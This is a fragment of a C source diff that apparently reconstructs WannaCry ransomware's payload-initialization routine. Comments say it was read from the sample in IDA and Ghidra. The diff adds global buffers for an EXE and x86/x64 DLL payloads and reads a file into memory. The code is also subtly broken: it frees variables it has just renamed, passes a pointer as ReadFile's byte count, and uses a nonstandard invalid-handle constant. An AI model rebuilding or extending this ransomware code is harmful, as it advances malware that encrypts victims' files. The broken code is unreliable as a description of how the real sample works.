@@ -24,6 +24,11 @@ int xor_payload(int xor_key, int buf, int size)
 	return 0;
 }
 
+//EXE file global here
+HGLOBAL EXE_BUFFER;
+HGLOBAL hDLL_x86;
+HGLOBAL hDLL_x64;
+
 //init the DLL payload here
 //read from Wannacry in IDA
 //also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
@@ -36,23 +41,27 @@ HGLOBAL initialize_payload()
 	DWORD NumberOfBytesRead;
 	DWORD fileSize;
 	//size = 0x4060 converted to decimal: 16480
-	HGLOBAL hMemory_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
-	/* 0x50D000 found in Ghidra but most likely: 0x506000 for 32 bit */
+	hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176); 
+	/* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */
 	
 	//size = 0xc8a4 converted to decimal: 51364
-	HGLOBAL hMemory_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
+	hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA
 	
-	if(something_happens_here)
+	//if no errors continue, otherwise close and abort()
+	if(hDLL_x86 || hDLL_x64)
 	{
 		//GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
 		HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
 		if(fileHandle != INVALID_FILE_HANDLE)
 		{
 			fileSize = GetFileSize(fileHandle, NULL);
-			ReadFile(fileHandle, EXE_BUFFER_SOMEWHERE, &fileSize, &NumberOfBytesRead, 0);
+			EXE_BUFFER = GlobalAlloc(GMEM_ZEROINIT, fileSize); 
+			ReadFile(fileHandle, EXE_BUFFER, &fileSize, &NumberOfBytesRead, 0);
     			CloseHandle(fileHandle);
-			
 		}
+	}
+	else
+	{
 		GlobalFree(hMemory_x86);
 		GlobalFree(hMemory_x64);
 		abort(); // or return NULL;
